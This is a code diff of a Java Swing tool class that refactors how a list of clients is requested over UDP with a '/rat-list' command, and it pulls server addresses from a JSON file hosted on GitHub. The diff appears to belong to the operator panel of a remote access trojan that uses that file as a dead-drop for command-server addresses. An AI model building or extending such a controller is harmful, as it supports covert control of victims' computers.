@@ -15,6 +15,7 @@ import static com.wpkg.cli.utilities.JSONParser.getAddress;
 public class Tools {
     public static JSONParser.ClientJSON clientJSON;
     public static JSONParser.CommandsJSON commandsJSON;
+    public static String URL = "https://raw.githubusercontent.com/W-P-K-G/JSONFiles/master/";
 
     public static String readStringFromURL(String requestURL)
     {
@@ -32,17 +33,11 @@ public class Tools {
         }
     }
 
-    public static void requestClientList(DefaultListModel<String> ClientListModel) {
-        UDPClient.sendString("/rat-list");
-        String json = UDPClient.receiveString();
-
-        refreshClientList(ClientListModel, json);
-    }
-
-    public static void refreshClientList(DefaultListModel<String> ClientListModel, String json)
+    public static void refreshClientList(DefaultListModel<String> ClientListModel)
     {
+        UDPClient.sendString("/rat-list");
         ClientListModel.clear();
-        clientJSON = JSONParser.getClientList(json);
+        clientJSON = JSONParser.getClientList(UDPClient.receiveString());
         for(int i = 0; i < clientJSON.clients.length; i++){
             ClientListModel.add(i,"\uD83D\uDDA5️     \uD83D\uDCB3 ID: "+ clientJSON.clients[i].id + "        "
                     +" \uD83D\uDCD6 NAME: "+ clientJSON.clients[i].name);
@@ -59,7 +54,7 @@ public class Tools {
     }
 
     public static void refreshServerList(JComboBox IPField){
-        JSONParser.AddressJSON address = getAddress(Tools.readStringFromURL("https://raw.githubusercontent.com/W-P-K-G/JSONFiles/master/Addreses.json"));
+        JSONParser.AddressJSON address = getAddress(Tools.readStringFromURL(URL+"Addreses.json"));
         ArrayList<String> list = new ArrayList<String>();
         for(int i = 0; i < address.uAddresses.length; i++)
             list.add(address.uAddresses[i].ip+":"+address.uAddresses[i].port);
